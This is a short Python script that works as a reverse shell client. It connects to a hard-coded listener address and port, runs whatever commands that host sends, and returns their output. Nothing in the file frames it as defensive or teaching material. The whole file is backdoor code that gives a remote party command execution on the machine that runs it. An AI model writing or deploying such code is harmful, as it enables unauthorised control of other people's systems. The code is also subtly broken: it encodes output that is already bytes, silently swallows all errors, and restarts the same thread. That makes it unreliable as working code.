import socket
import threading
import sys
import time
from subprocess import run
LHOST = "10.100.3.131"
LPORT = 5555

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect((LHOST,LPORT))




def getCommand():
    while True:
        try:
            command = client.recv(2048).decode('ascii')
            output = run(command, capture_output=True).stdout
            client.send(output.encode('ascii'))
        except:
            pass


def sendConnection():
    while True:       
        client.send('CONNECTED'.encode('ascii'))
        commandThread.start()
        time.sleep(250)       
commandThread = threading.Thread(target=getCommand)

sendSignalThread = threading.Thread(target=sendConnection)
sendSignalThread.start()
